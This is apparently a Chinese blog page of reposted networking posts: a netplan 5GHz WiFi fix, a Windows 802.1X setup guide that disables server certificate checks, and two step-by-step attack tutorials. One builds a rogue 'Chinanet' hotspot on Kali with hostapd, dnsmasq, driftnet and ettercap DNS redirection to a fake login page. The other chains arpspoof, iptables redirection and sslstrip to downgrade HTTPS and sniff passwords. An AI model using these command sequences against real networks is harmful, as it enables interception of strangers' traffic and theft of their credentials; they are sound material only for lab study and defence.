+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IDX LINK  TYPE     OPERATIONAL SETUP</span><br><span class="line">  1 lo    loopback carrier     unmanaged</span><br><span class="line">  2 eth0  ether    routable    configured</span><br><span class="line">  3 wlan0 wlan     no-carrier  configuring</span><br><span class="line"></span><br><span class="line">3 links listed.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检查无线网络连接服务配置状态:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status netplan-wpa-wlan0.service</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>显示连接了一个明显错误的 <code>bssid=00:00:00:00:00:00</code> 的无线AP，导致认证错误:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">● netplan-wpa-wlan0.service - WPA supplicant <span class="keyword">for</span> netplan wlan0</span><br><span class="line">     Loaded: loaded (/run/systemd/system/netplan-wpa-wlan0.service; enabled-runtime; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Thu 2020-11-05 16:17:34 CST; 2min 7s ago</span><br><span class="line">   Main PID: 1932 (wpa_supplicant)</span><br><span class="line">      Tasks: 1 (<span class="built_in">limit</span>: 9257)</span><br><span class="line">     CGroup: /system.slice/netplan-wpa-wlan0.service</span><br><span class="line">             └─1932 /sbin/wpa_supplicant -c /run/netplan/wpa-wlan0.conf -iwlan0</span><br><span class="line"></span><br><span class="line">Nov 05 16:18:51 pi-worker2 wpa_supplicant[1932]: wlan0: CTRL-EVENT-ASSOC-REJECT bssid=00:00:00:00:00:00 status_code=16</span><br><span class="line">Nov 05 16:10:27 pi-worker2 wpa_supplicant[1849]: wlan0: Trying to associate with SSID <span class="string">&#x27;SSID-OFFICE&#x27;</span></span><br><span class="line">Nov 05 16:10:30 pi-worker2 wpa_supplicant[1849]: wlan0: CTRL-EVENT-ASSOC-REJECT bssid=00:00:00:00:00:00 status_code=16</span><br><span class="line">Nov 05 16:10:30 pi-worker2 wpa_supplicant[1849]: wlan0: CTRL-EVENT-SSID-TEMP-DISABLED <span class="built_in">id</span>=0 ssid=<span class="string">&quot;SSID-OFFICE&quot;</span> auth_failures=1 duration=23 reason=CONN_FAILED</span><br></pre></td></tr></table></figure>
+
+<p>经过一周 <a target="_blank" rel="noopener" href="https://github.com/huataihuang/cloud-atlas-draft/blob/master/os/linux/redhat/system_administration/systemd/debug_systemd_networkd.md">排查wpa_supplicant无法连接5GHz无线问题</a> 终于发现对于5G Hz无线网络连接，必须在 <code>wpa_supplicant.conf</code> 中指定 <code>Country Code</code> 。</p>
+<p>不过，netplan的配置中当前不支持配置 <code>country=</code> ，所以可以采用两种方法：</p>
+<ul>
+<li><p>在执行 <code>wpa_supplicant</code> 之前，先通过 <code>wireless-tools</code> 工具包中的 <code>iw</code> 命令设置 <code>regdomain</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iw reg <span class="built_in">set</span> CN</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>然后 <code>wpa_supplicant</code> 就可以连接5G Hz的无线AP。</p>
+<ul>
+<li><p>为了能够持久化上述 <code>regdomain</code> 配置，在Ubuntu中，可以修改 <code>/etc/default/crda</code> 配置设置如下:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">REGDOMAIN</span>=CN</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>然后重启就能够正常连接5G Hz无线网络。</p>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.tecmint.com/configure-network-static-ip-address-in-ubuntu/">How to Configure Network Static IP Address in Ubuntu 18.04</a></li>
+<li><a target="_blank" rel="noopener" href="https://netplan.io/examples">Netplan configuration examples</a></li>
+<li><a target="_blank" rel="noopener" href="https://serverfault.com/questions/920020/netplan-not-spoofing-mac-as-expected">Netplan not spoofing MAC as expected</a></li>
+<li><a target="_blank" rel="noopener" href="https://netplan.io/reference/">Netplan reference</a></li>
+<li><a target="_blank" rel="noopener" href="https://vitux.com/how-to-configure-networking-with-netplan-on-ubuntu/">How to configure networking with Netplan on Ubuntu</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Netplan/" rel="tag">Netplan</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2025/11/13/Windows-802.1x/">
+                WIN10系统使用自带软件进行有线802.1X认证时的配置方法
+            </a>
+        </h2>
+    
+    <time>
+        Nov 13, 2025
+    </time>
+    <section class="content">
+        <h1><span id="win10系统使用自带软件进行有线8021x认证时的配置方法">WIN10系统使用自带软件进行有线802.1X认证时的配置方法</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/cn/zh/thread/blog/580922949744082944?blogId=580922949744082944">丁晏</a> 并作补充</p>
+</blockquote>
+<h2><span id="前提条件">前提条件</span></h2><blockquote>
+<p>选择“开始 &gt; 控制面板”，依次单击“系统和安全”、“管理工具”和“服务”，确认“Extensible Authentication Protocol”和“Wired AutoConfig”两个服务的“启动类型”为“自动”，“状态”为“正在运行”。</p>
+</blockquote>
+<h2><span id="操作步骤">操作步骤</span></h2><blockquote>
+<p>1、选择“开始 &gt; 控制面板”。<br>2、在“控制面板”选择“网络和Internet &gt; 网络和共享中心 &gt; 查看网络状态和任务 &gt; 以太网”（控制面板的“查看方式”选择“类别”时可显示“网络和Internet”）。</p>
+<p><img src="/2025/11/13/Windows-802.1x/1.png" alt="image"></p>
+<p>3、在“以太网状态”窗口，选择“属性”。<br>4、在“身份验证”页签，选中“启用IEEE 802.1X身份验证”，“选择网络身份验证方法”设置为“Microsoft: 受保护的EAP（PEAP）”，单击“设置”。</p>
+<p><img src="/2025/11/13/Windows-802.1x/2.png" alt="image"></p>
+<p>5、取消勾选“通过验证证书来验证服务器的身份”，“选择身份验证方法”选择“安全密码（EAP-MSCHAP v2）”，单击“配置”。</p>
+<p><img src="/2025/11/13/Windows-802.1x/3.png" alt="image"></p>
+<p>6、取消选中“自动使用 Windows 登录名和密码”，单击“确定”。</p>
+<p><img src="/2025/11/13/Windows-802.1x/4.png" alt="image"></p>
+<p>说明：如果操作系统使用AD域帐号登录，并且用来进行802.1X认证的用户名和密码也是使用的登录操作系统的域帐号和密码，则勾选“自动使用Windows登录名和密码”。</p>
+<p>7、等待Windows弹出认证框，即可输入用户名和密码进行认证。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/Fishing-WiFi/">
+                kali搭建钓鱼WiFi
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="kali搭建钓鱼wifi">kali搭建钓鱼WiFi</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.bbskali.cn/2179.html">逍遥子</a> 并作补充</p>
+<p>如何在kali下快速搭建钓鱼WiFi呢？全网最简单最详细的教程核能来袭。一起来看看吧。</p>
+</blockquote>
+<h2><span id="准备">准备</span></h2><blockquote>
+<ul>
+<li>USB无线网卡（推荐8187 3070）</li>
+<li>hostapd dnsmasq apache2</li>
+<li>kali2020(最新版)</li>
+</ul>
+</blockquote>
+<h3><span id="配置无线网卡">配置无线网卡</span></h3><blockquote>
+<p>在终端执行 <code>ifconfig</code>查看是否有 <code>wlan0</code>如果存在，我们需要激活为监听模式。执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/1.png" alt="image" title="开启网卡监听模式"></p>
+</blockquote>
+<h3><span id="配置hostapd">配置hostapd</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim hostapd.conf</span><br></pre></td></tr></table></figure>
+
+<p>写入下面内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">driver=nl80211</span><br><span class="line">ssid=Chinanet <span class="comment">#无线名称 随意即可</span></span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">ignore_broadcast_ssid=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="配置dnsmasq文件">配置dnsmasq文件</span></h3><blockquote>
+<p>终端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dnsmasq.conf</span><br></pre></td></tr></table></figure>
+
+<p>写入内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h</span><br><span class="line">dhcp-option=3, 192.168.1.1</span><br><span class="line">dhcp-option=6, 192.168.1.1</span><br><span class="line">server=8.8.8.8</span><br><span class="line">log-queries</span><br><span class="line">log-dhcp</span><br><span class="line">listen-address=127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="配置防火墙和端口转发">配置防火墙和端口转发</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</span><br><span class="line">iptables --append FORWARD --in-interface wlan0mon -j ACCEPT</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/4.png" alt="image"></p>
+<p>这样做的目的是保证我们的鱼儿能够正常上网。</p>
+</blockquote>
+<h3><span id="给无线网卡分配ip地址">给无线网卡分配IP地址</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0</span><br><span class="line">route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="启动钓鱼热点">启动钓鱼热点</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostapd hostapd.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/5.png" alt="image"></p>
+<p>这样我们便可以看到有一个 <code>china-net</code>的热点，但是不能连接，不要着急，我们启动dnsmasq即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq -C dnsmasq.conf -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这样，我们的热点便可以正常连接并上网了。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/6.png" alt="image"></p>
+<p>左边为连接的设备，右边有设备访问的网站信息。</p>
+</blockquote>
+<h2><span id="高级操作">高级操作</span></h2><h3><span id="嗅探目标图片">嗅探目标图片</span></h3><blockquote>
+<p>在终端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0mon</span><br></pre></td></tr></table></figure>
+
+
+
+<p>便可以看到目标访问的站点图片信息。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="中间人攻击">中间人攻击</span></h3><h4><span id="域名重定向">域名重定向</span></h4><blockquote>
+<p>修改 <code>/etc/ettercap/etter.dns</code>文件，添加内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com      A   192.168.1.1</span><br><span class="line">*.baidu.com    A   192.168.1.1</span><br><span class="line">www.baidu.com  PTR 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>即，当我们访问百度，自动跳转到本地。<br>开启本地 <code>apache</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将做好的钓鱼页面放到 <code>/var/www/html</code>目录下，然后终端执行 <code>ettercap -G</code>利用 <code>ettercap</code>进行DNS劫持，具体做法这里不再诉述。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/8.png" alt="image" title="仿电信钓鱼页面"></p>
+<p>当然，你也可以对目标进行数据包的捕获和分析，我们这里也不再说了。</p>
+</blockquote>
+<h3><span id="填个坑">填个坑</span></h3><blockquote>
+<p>有不少人搭建完成后，反应上不了网，是因为dns冲突了。如你家的路由器的网段是<code>192.168.1.1/24</code>而在dns的配置文件中<code>dhcp-option=3, 192.168.1.1</code>这样会冲突，解决办法很简单，把<code>192.168.1.1</code>改成其他网段就行了，如<code>192.168.5.1</code>，但是后面的规则也要改。最简单的方法就是登陆路由器，将<code>lan</code>口地址<code>192.168.1.1</code>改掉就行了！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fishing/" rel="tag">Fishing</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/ARP-SSLStrip/">
+                如何进行一次完整的 SSLStrip 攻击
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="如何进行一次完整的-sslstrip-攻击">如何进行一次完整的 SSLStrip 攻击</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">Glsakura</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>本文将介绍在局域网内，如何监听受害者流量并通过SSLstrip攻击获取敏感信息，分为如下两步：</p>
+<ol>
+<li>中间人攻击，监听受害者流量</li>
+<li>SSLStrip攻击，获取敏感信息</li>
+</ol>
+</blockquote>
+<h2><span id="实验环境">实验环境</span></h2><blockquote>
+<table>
+<thead>
+<tr>
+<th>IP地址</th>
+<th>MAC地址</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>win10</td>
+<td>192.168.40.1</td>
+<td>00:50:56:C0:00:08</td>
+</tr>
+<tr>
+<td>网关</td>
+<td>192.168.40.2</td>
+<td>00:50:56:E7:9F:31</td>
+</tr>
+<tr>
+<td>kali</td>
+<td>192.168.40.128</td>
+<td>00:0c:29:d8:d4:05</td>
+</tr>
+<tr>
+<td>win7</td>
+<td>192.168.40.130</td>
+<td>00:0C:29:C9:34:A6</td>
+</tr>
+<tr>
+<td>centos7</td>
+<td>192.168.40.132</td>
+<td>00:0c:29:bd:ef:65</td>
+</tr>
+</tbody></table>
+<p>kali：<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali-images/kali-2020.1b/kali-linux-2020.1b-live-amd64.iso">kali-linux-2020.1b-live-amd64.iso</a></p>
+<p>win7：<a target="_blank" rel="noopener" href="http://d0.ananas.chaoxing.com/download/16169a8dcb8f0e07b98d19c870b10ce3?fn=WIN7lite(x64)">win7</a></p>
+<p>纯净虚拟机系统，使用VMware或者VirtualBox导入镜像即可。<br>采用Win7SP1镜像制作，极限精简，无多余组件，非常纯净，使用流畅，系统已激活。</p>
+</blockquote>
+<h2><span id="中间人攻击">中间人攻击</span></h2><blockquote>
+<p>中间人攻击（<a target="_blank" rel="noopener" href="http://man.linuxde.net/man">man</a>-in-the-Middle Attack, MITM)，就是攻击者扮演中间人进行攻击，可以劫持一段会话，窃取凭证和其他机密信息。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。</p>
+</blockquote>
+<h3><span id="arp-地址解析协议">ARP （地址解析协议）</span></h3><blockquote>
+<p>ARP 协议负责通过 IP 地址找到 MAC 地址（物理地址 ），在以太网中，是利用 MAC 地址来通讯的。</p>
+<p>ARP协议是这样工作的：如win10需要给win7（IP为192.168.40.130)发送数据，为了知道谁是win7，首先win10发送一个广播包给网内所有机器“谁是192.168.40.130”，正常情况其他机器忽略该消息，仅win7回复“我是192.168.40.130”，于是通信就可以开始。所有的主机维护他们自己的ARP缓存表，所以不会每一次都发送广播，ARP表中包含IP对应的MAC地址。</p>
+</blockquote>
+<h4><span id="如何进行arp欺骗">如何进行ARP欺骗?</span></h4><blockquote>
+<p>例如kali需要对win7进行arp欺骗，那他就不再忽略win10发送的消息，他也会大量的发送数据包回复“啊啊啊！我才是192.168.40.130”，然后win10就会错误地建立或者更新了自己ARP表。然后win10发送数据时都发到kali那去了。</p>
+</blockquote>
+<h2><span id="攻击准备">攻击准备</span></h2><h4><span id="mac-下准备">mac 下准备</span></h4><blockquote>
+<ol>
+<li>安装 macports <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=https://www.macports.org/install.php">官网</a></li>
+<li>更新 macports <code>sudo port -d selfupdate</code></li>
+<li>安装 dsniff（包含 arp 攻击的工具）<code>sudo port install dsniff</code></li>
+<li>安装 nmap <code>brew install nmap</code> (如果没有安装 Homebrew，可以去 <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://brew.sh/">Homebrew 官网</a></li>
+</ol>
+</blockquote>
+<h4><span id="linux-下准备">linux 下准备</span></h4><blockquote>
+<ol>
+<li>安装 dsniff <code>apt-get install -y dsniff</code></li>
+<li>安装 nmap <code>apt-get install -y nmap</code></li>
+</ol>
+</blockquote>
+<h2><span id="攻击步骤">攻击步骤</span></h2><h3><span id="寻找目标">寻找目标</span></h3><blockquote>
+<p>使用nmap命令扫描局域网，获得主机列表<br>如果所在局域网路由器地址是 192.168.40.1,可以使用 <code>nmap -sP 192.168.40.1/24</code> 扫描</p>
+<p>-sP 表示使用 ping 方式扫描，192.168.40.1&#x2F;24”表示扫描”192.168.40.1-192.168.40.254”这个网段的所有机器。</p>
+</blockquote>
+<h3><span id="开启-ip-转发">开启 IP 转发</span></h3><blockquote>
+<p>ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为本机不是网关，不知道如何处理这类数据包），这会导致没有数据包返回给被欺骗主机，导致断网。这当然是不允许的。开启IP转发功能可以解决该问题。IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法。</p>
+<p>mac 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.inet.ip.forwarding=1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>linux 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="arp-欺骗">ARP 欺骗</span></h3><blockquote>
+<p>假设被攻击的 IP 是 192.168.40.130，局域网的网关是 192.168.40.2，攻击电脑使用的网卡接口是 eth0(可以使用 <code>ifconfig</code> 命令查看）, 则欺骗命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br><span class="line"><span class="comment">#arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功的的话在被攻击主机上arp表如图所示</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="分析数据">分析数据</span></h3><blockquote>
+<p>如果 ARP 欺骗成功，则被攻击的设备会把所有数据先传到我们电脑上，接下来可以使用 ettercap 软件来分析数据。</p>
+</blockquote>
+<h2><span id="使用driftnet获取图片">使用driftnet获取图片</span></h2><blockquote>
+<p>安装driftnet<code>apt-get install driftnet</code></p>
+<p>开始获取<code>driftnet -i eth0</code></p>
+<p>找一个http的网站进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:“http” -https</span><br></pre></td></tr></table></figure>
+
+<p>例子：<code>http://www.kan-tv.com/</code></p>
+<p>Tips:https因为进行了加密不能直接获取，进行SSLStrip攻击后就可获取了</p>
+</blockquote>
+<h2><span id="sslstrip-攻击">SSLStrip 攻击</span></h2><blockquote>
+<p>2009年的黑帽大会上，一个名叫Moxie Marlinspike的研究人员,发布了一个叫sslstrip的工具。通过该工具，可以实现对ssl进行中间人攻击。</p>
+<p>SSLstrip 也叫 https 降级攻击，攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p>
+</blockquote>
+<h3><span id="攻击原理">攻击原理</span></h3><blockquote>
+<p>攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替。同时，与目标服务器建立正常的HTTPS连接。由于HTTP通信是没有经过加密传输的，并没有HTTPS安全，所以攻击者能轻松实施嗅探。</p>
+<ol>
+<li>通过中间人攻击监听 http 流量</li>
+<li>更改重定向链接中的 location，替换 https 为 http，并记录</li>
+<li>更改响应内容中的超链接，替换 https 为 http，并记录</li>
+<li>与用户进行 http 通信，与服务器进行 https 通信（记录中本应是 https 的请求），从而明文获取用户信息</li>
+</ol>
+<p>Tips:</p>
+<p>当用户浏览的网页中包含https协议，会被转化为http协议的请求</p>
+<p>但是sslstrip也不是万能的， 假如网页中没有https， 但是js代码绑定了跳转到https的协议请求的事件，那么sslstrip就失效了</p>
+</blockquote>
+<h3><span id="攻击准备">攻击准备</span></h3><blockquote>
+<ol>
+<li><p>监听 http 流量</p>
+</li>
+<li><p>获取 <a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip工具</a></p>
+<p>Requirements</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python &gt;= 2.5 (apt-get install python)</span><br><span class="line">The python <span class="string">&quot;twisted-web&quot;</span> module (apt-get install python-twisted-web)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install python python-twisted-web</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/moxie0/sslstrip.git</span><br><span class="line"><span class="built_in">cd</span> sslstrip &amp;&amp; python ./setup.py install</span><br></pre></td></tr></table></figure></li>
+</ol>
+</blockquote>
+<h3><span id="攻击步骤">攻击步骤</span></h3><h4><span id="开启内核转发功能保证攻击过程中被攻击者不断网">开启内核转发功能保证攻击过程中被攻击者不断网</span></h4><blockquote>
+<p>临时ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>永久ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1        //修改值</span><br><span class="line">sysctl -p /etc/sysctl.conf    //使修改生效</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="把流量导入到-sslstrip-程序">把流量导入到 sslstrip 程序</span></h4><blockquote>
+<p>设置iptables以将HTTP通信重定向到sslstrip。<br>输入命令： <code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code><br>其中最后面的端口号（比如上面的 10000）就是 sslstrip 程序监听的端口号</p>
+<p>如果攻击完成后要删除这条记录可以输入命令 <code>iptables -t nat -D PREROUTING 1</code></p>
+<p>查看 ip 转发表： <code>iptables -t nat -L</code></p>
+</blockquote>
+<h4><span id="运行arpspoof以说服网络他们应该将流量发送给你">运行arpspoof以说服网络他们应该将流量发送给你</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="启动sslstrip">启动sslstrip</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 10000</span><br><span class="line"></span><br><span class="line">-w &lt;文件名&gt;，–write = &lt;文件名&gt;指定要登录的文件（可选）。</span><br><span class="line">-p，–post仅记录SSL POST。（默认）</span><br><span class="line">-s，–ssl记录往返服务器的所有SSL流量。</span><br><span class="line">-a，–all记录往返服务器的所有SSL和HTTP通信。</span><br><span class="line">-l &lt;端口&gt;，–listen = &lt;端口&gt;用于侦听的端口（默认为10000）。</span><br><span class="line">-f，–favicon根据安全请求替换锁图标。</span><br><span class="line">-k，–killsessions终止正在进行的会话。</span><br><span class="line">-h 打印此帮助消息。</span><br><span class="line"></span><br><span class="line">查看端口占用lsof -i tcp:10000</span><br><span class="line"></span><br><span class="line">sslstrip -a -k -f -l 10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/ARP-SSLStrip/2.png" alt="image"></p>
+<p>可以看到，网页上没有任何不安全的警告或是提示，只是原先的HTTPS连接已经被HTTP连接所替换，并且为增加迷惑性，网页的图标被修改成了一个银色的锁图案。但是，假的毕竟是假的，一方面无法查看到任何证书的信息，另外如果在网址前输入https:&#x2F;&#x2F;，则网页无法发开。因此，sslstrip并不是万能的攻击方法。</p>
+</blockquote>
+<h3><span id="使用ettercap对目标主机进行arp攻击并且开始嗅探密码">使用ettercap对目标主机进行arp攻击，并且开始嗅探密码</span></h3><blockquote>
+<p>终端界面嗅探密码<code>ettercap -Tq -i eth0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-P  使用插件</span><br><span class="line">-T  使用基于文本界面</span><br><span class="line">-q  启动安静模式（不回显）</span><br><span class="line">-M  启动ARP欺骗攻击</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们使用ettercap的GTK+ GUI图像界面<code>ettercap -G</code></p>
+<p><img src="/2023/12/06/ARP-SSLStrip/3.png" alt="image"></p>
+<p>选择Sniff—-Unified-sniffing，然后选择网卡：eth0(我这里是eth0，大家根据情况选择)。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/4.png" alt="image"></p>
+<p>然后Hosts——Scan for hosts——Hosts list</p>
+<p>我们的目标主机ip(192.168.40.130)选定目标主机，然后点add to target 1，将目标主机添加到目标；选定路由，点add to target 2，将路由添加到目标2</p>
+<p>添加成功后，点击Mitm——ARP posoning ，勾选sniff remote connections。</p>
+<p>之后start——start sniffing开始监听。</p>
